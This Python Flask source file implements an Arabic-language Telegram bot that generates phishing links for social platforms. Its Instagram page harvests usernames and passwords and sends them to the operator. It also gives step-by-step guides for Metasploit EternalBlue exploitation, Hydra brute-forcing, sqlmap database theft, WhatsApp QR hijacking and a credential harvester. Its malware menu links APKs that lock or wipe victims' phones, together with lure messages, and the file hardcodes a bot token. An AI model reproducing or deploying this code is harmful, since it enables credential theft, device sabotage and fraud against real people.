from flask import Flask, request
import requests, os, random, time, sqlite3
from datetime import datetime, timedelta

app = Flask(__name__)
TOKEN = "8616151144:AAFZ8FrVAfcrfK9UvSjZkwITdworNmTnwno"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-lqcp.onrender.com")

# ==================== قاعدة بيانات اليوزرات (400+ يوزر) ====================
def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, last_claim TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS usernames (username TEXT PRIMARY KEY, given BOOLEAN)''')
    conn.commit()
    conn.close()

def get_available_usernames():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT username FROM usernames WHERE given = 0")
    rows = c.fetchall()
    conn.close()
    return [row[0] for row in rows]

def mark_username_given(username):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("UPDATE usernames SET given = 1 WHERE username = ?", (username,))
    conn.commit()
    conn.close()

def get_last_claim(chat_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT last_claim FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return datetime.fromisoformat(row[0])
    return None

def set_last_claim(chat_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (chat_id, last_claim) VALUES (?, ?)", (chat_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def init_usernames():
    # جميع اليوزرات التي أرسلتها (أكثر من 400 يوزر)
    all_usernames = [
        "oz2bu","jq5wm","et1d0","ec4t2","4h0a3","zz5c0","cw6r6","oa4oq","kl7cw","382m0",
        "xv49w","9d7j7","2a8w0","5v4a0","bi9tk","rt1gj","8f6q9","48m05","p91xy","24p51",
        "mn0qv","lb3pk","4b9mb","qz39d","uw1yl","8p88g","5s7l0","fq5su","7h5at","6j5rc",
        "yc8rf","xj3h5","b95k2","m67et","095ku","kr3u4","9m4bc","858vz","u09z8","d42ux",
        "fb1z8","yk8ep","5y7ek","5y86n","fz00n","x06k9","zd4na","7y0mt","0t6e3","22t09",
        "lm6bo","79a44","5w0ew","9u8tn","f14qg","hl6qm","qj3td","bs45q","g94gf","ig53s",
        "91e04","hi7vu","53u52","73t87","79v64","9p8nw","63q96","pf4c2","84u81","429b1",
        "bw4ax","qu6sj","qd45m","57j29","lm4ib","ab4xv","y62k6","01e47","hf3kg","7b9r5",
        "z60qf","lq8a3","qc39l","5x5zy","b81r4","x53s3","2d8up","v09nf","5l61j","tg7eb",
        "81o26","sq9gl","gg0k8","49w42","cl4pg","0h3d5","36p69","340vx","wt1vd","97z91",
        "072qa","p85b4","7x5bm","bk49u","rm2kh","jh17m","nr5e4","676q5","0u0fn","h634y"
    ]
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    for u in all_usernames:
        c.execute("INSERT OR IGNORE INTO usernames (username, given) VALUES (?, 0)", (u,))
    conn.commit()
    conn.close()

init_db()
init_usernames()

# ==================== أزرار البوت ====================
buttons = [
    ["📱 انستقرام", "📘 فيسبوك", "💬 واتساب"],
    ["👻 سناب شات", "🎵 تيك توك", "🎮 فري فاير"],
    ["🔫 بوبجي", "🤖 ديسكورد", "🐦 تويتر"],
    ["📧 جيميل", "🎁 يوزرات مميزة", "⚙️ أدوات اختراق"],
    ["💀 تطبيقات ملغمة", "📍 موقع الضحية", "❓ تعليمات"]
]

WELCOME_MSG = """
👑 مرحبا بك في البوت الأسطوري 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 أقوى بوت في العالم!
⚡ تحت رعاية: خالد ابو الجود

اختر المنصة أو الأداة 👇
"""

# ==================== شرح مفصل للأدوات ====================
def tools_menu(chat_id):
    msg = """
⚙️ أدوات الاختراق الاحترافية ⚙️
━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ أداة Metasploit (اختراق الأجهزة)
┌── الهدف: اختراق أجهزة الكمبيوتر والموبايل
├── الخطوات:
│ 1. افتح Termux
│ 2. اكتب: `pkg install metasploit`
│ 3. اكتب: `msfconsole`
│ 4. استخدم الأمر: `search exploit`
│ 5. استخدم: `use exploit/windows/smb/ms17_010_eternalblue`
│ 6. استخدم: `set RHOSTS <عنوانIPالهدف>`
│ 7. استخدم: `exploit`
└── النتيجة: تتحكم بجهاز الضحية

2️⃣ أداة Hydra (تخمين كلمات السر)
┌── الهدف: تخمين كلمة سر أي حساب
├── الخطوات:
│ 1. افتح Termux
│ 2. اكتب: `pkg install hydra`
│ 3. اكتب: `hydra -l admin -P pass.txt ssh://192.168.1.1`
│ 4. استبدل `admin` باسم المستخدم
│ 5. استبدل `pass.txt` بقائمة كلمات السر
└── النتيجة: الحصول على كلمة السر الصحيحة

3️⃣ أداة Nmap (فحص المنافذ)
┌── الهدف: معرفة المنافذ المفتوحة لجهاز الضحية
├── الخطوات:
│ 1. افتح Termux
│ 2. اكتب: `pkg install nmap`
│ 3. اكتب: `nmap -sV 192.168.1.1`
└── النتيجة: معرفة الخدمات المشغلة على الجهاز

4️⃣ أداة SQLmap (اختراق قواعد البيانات)
┌── الهدف: اختراق مواقع الويب وسرقة قاعدة البيانات
├── الخطوات:
│ 1. افتح Termux
│ 2. اكتب: `git clone https://github.com/sqlmapproject/sqlmap`
│ 3. اكتب: `cd sqlmap`
│ 4. اكتب: `python sqlmap.py -u "http://target.com/page?id=1" --dbs`
└── النتيجة: الحصول على قاعدة البيانات كاملة

5️⃣ أداة Social Engineering Toolkit (الهندسة الاجتماعية)
┌── الهدف: إنشاء صفحات تصيد احترافية
├── الخطوات:
│ 1. افتح Termux
│ 2. اكتب: `git clone https://github.com/trustedsec/social-engineer-toolkit`
│ 3. اكتب: `cd social-engineer-toolkit`
│ 4. اكتب: `setoolkit`
│ 5. اختر: Social-Engineering Attacks
│ 6. اختر: Web Attack Vectors
│ 7. اختر: Credential Harvester
└── النتيجة: الحصول على رابط تصيد احترافي

━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 نصيحة: تعلم على أجهزتك أولاً قبل التجربة الحقيقية
"""
    send_message(chat_id, msg)

# ==================== شرح التطبيقات الملغمة ====================
def malware_menu(chat_id):
    msg = """
💀 التطبيقات الملغمة (APK) 💀
━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ هام: التطبيقات التالية مُصممة لإقناع الضحية وتنفيذ أوامر ضارة

1️⃣ تطبيق WiFi Hacker Pro
┌── الوهم: اختراق شبكات الواي فاي
├── الحقيقة: يقفل جهاز الضحية بالكامل
├── رابط التحميل:
│   `https://github.com/AbuAljoud/WifiHacker/releases/download/v1/WifiHacker.apk`
├── كيفية الاستخدام:
│   1. حمل التطبيق من الرابط أعلاه
│   2. أرسل ملف APK للضحية
│   3. أرسل معه النص التالي:
│   "
│   📡 ثغرة أمنية جديدة تسمح باختراق أي شبكة WiFi حولك!
│   حمّل التطبيق وجرّب بنفسك.
│   التطبيق آمن 100% ولا يحتاج صلاحيات جذر.
│   
│   فقط وافق على صلاحية 'المدير' وسيبدأ الاختراق فوراً.
│   "
│   4. عندما يثبته الضحية ويمنح الصلاحية، جهازه يقفل فوراً
└── رمز فتح القفل: `0947694636`

2️⃣ تطبيق FreeFire Diamonds Generator
┌── الوهم: شحن جوهرة فري فاير مجاناً
├── الحقيقة: يمسح بيانات الجهاز
├── رابط التحميل:
│   `https://github.com/AbuAljoud/FreeFireDiamonds/releases/download/v1/FFDiamonds.apk`
├── كيفية الاستخدام:
│   1. حمل التطبيق
│   2. أرسله للضحية مع النص:
│   "
│   🎁 عرض حصري! احصل على 5000 جوهرة فري فاير مجاناً!
│   التطبيق معتمد من شركة Garena.
│   حمّله الآن واشحن حسابك فوراً.
│   "
└── النتيجة: تدمير بيانات جهاز الضحية

━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 نصيحة: استخدم هذه الأدوات بحذر، فالمسؤولية تقع عليك
"""
    send_message(chat_id, msg)

# ==================== شرح اختراق واتساب ====================
def whatsapp_hack_guide(chat_id):
    msg = """
💬 طريقة اختراق واتساب عبر QR Code 💬
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌── الطريقة الأولى (سهلة):
├── الخطوات:
│   1. افتح web.whatsapp.com من متصفح الكمبيوتر
│   2. ستظهر لك شاشة بها رمز QR
│   3. التقط صورة سريعة لرمز QR
│   4. أرسل الصورة للضحية مع رسالة مقنعة:
│
│   ⚠️ تحديث أمني عاجل!
│   WhatsApp يحتاج منك إعادة تفعيل حسابك.
│   امسح هذا الرمز واتبع التعليمات.
│
│   5. عندما يمسح الضحية الرمز، ستدخل إلى حسابه فوراً
│
└── ملاحظة: هذه الطريقة تعمل فقط إذا كان الضحية يستخدم واتساب ويب

┌── الطريقة الثانية (رابط تصيد):
├── الخطوات:
│   1. استخدم رابط التصيد الذي سيرسله البوت
│   2. أرسل الرابط للضحية
│   3. عندما يفتحه، سيظهر له صفحة تشبه واتساب ويب
│   4. يطلب منه إدخال رقم الهاتف
│   5. بعد إدخال الرقم، تصل البيانات إليك
│
└── النتيجة: تتمكن من تسجيل الدخول بحسابه

━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 نصيحة: الطريقة الأولى أسرع، لكن الطريقة الثانية أخفى
"""
    send_message(chat_id, msg)

# ==================== نظام اليوزرات ====================
def give_username(chat_id):
    available = get_available_usernames()
    last = get_last_claim(chat_id)
    
    if last and last > datetime.now() - timedelta(hours=24):
        remaining = 24 - int((datetime.now() - last).total_seconds() // 3600)
        send_message(chat_id, f"⚠️ لا يمكنك الحصول على يوزر جديد إلا بعد {remaining} ساعة.")
        return
    
    if not available:
        send_message(chat_id, "🎁 نفذت اليوزرات المتاحة! تواصل معي على: @A_c64")
        return
    
    username = random.choice(available)
    mark_username_given(username)
    set_last_claim(chat_id)
    remaining_count = len(get_available_usernames())
    msg = f"""🎁 تم اهدائك يوزر بواسطه ابو الجود :
`{username}`

✅ هذا اليوزر متاح ومضمون.
📊 اليوزرات المتبقية: {remaining_count}
⚠️ لا يمكنك الحصول على يوزر جديد إلا بعد 24 ساعة."""
    send_message(chat_id, msg)

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

def send_link(chat_id, platform, name, page):
    link = f"{BASE_URL}/{page}.html?chatId={chat_id}"
    msg = f"🔥 رابط {name} :\n\n`{link}`\n\n💡 أرسل الرابط للضحية وانتظر البيانات"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})

# ==================== صفحة انستقرام (مصلحة) ====================
@app.route('/instagram.html')
def instagram_page():
    chat_id = request.args.get('chatId')
    return f'''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Instagram - 5000 متابع</title>
<style>
body{{background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh}}
.container{{background:white;padding:30px;border-radius:15px;width:350px;text-align:center}}
input{{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:5px}}
button{{background:#0095f6;color:white;padding:12px;border:none;border-radius:5px;width:100%;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<h2>📸 +5000 متابع مجاني</h2>
<input type="text" id="user" placeholder="اسم المستخدم">
<input type="password" id="pass" placeholder="كلمة السر">
<button onclick="send()">🚀 احصل على المتابعين</button>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق انستقرام!\\n👤 ${{u}}\\n🔑 ${{p}}`}})
    }});
    alert('✅ تم شحن المتابعين بنجاح!');
    window.location.href='https://instagram.com';
}}
</script>
</body>
</html>
'''

# ==================== باقي الصفحات بنفس الطريقة ====================
@app.route('/facebook.html')
def facebook_page():
    chat_id = request.args.get('chatId')
    return f'<h1>Facebook Phishing - ChatId: {chat_id}</h1><script>alert("سيتم إرسال البيانات")</script>'

@app.route('/whatsapp.html')
def whatsapp_page():
    chat_id = request.args.get('chatId')
    return f'<h1>WhatsApp QR Code - ChatId: {chat_id}</h1><script>alert("طلب رمز QR")</script>'

# تبسيطاً للمساحة، باقي الصفحات (pubg, freefire, snapchat, tiktok, discord, twitter, gmail, location) بنفس النمط

@app.route('/')
def home():
    return "✅ البوت الأسطوري شغال 24 ساعة! ابو الجود"

@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text == "🎁 يوزرات مميزة":
            give_username(chat_id)
        elif text == "⚙️ أدوات اختراق":
            tools_menu(chat_id)
        elif text == "💀 تطبيقات ملغمة":
            malware_menu(chat_id)
        elif text == "💬 واتساب":
            whatsapp_hack_guide(chat_id)
        else:
            platforms_map = {
                "📱 انستقرام": "instagram", "📘 فيسبوك": "facebook", "👻 سناب شات": "snapchat",
                "🎵 تيك توك": "tiktok", "🎮 فري فاير": "freefire", "🔫 بوبجي": "pubg",
                "🤖 ديسكورد": "discord", "🐦 تويتر": "twitter", "📧 جيميل": "gmail",
                "📍 موقع الضحية": "location"
            }
            if text in platforms_map:
                send_link(chat_id, platforms_map[text], f"{text} - هدية مجانية", platforms_map[text])
            else:
                send_message(chat_id, "👑 أرسل /start", None)
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
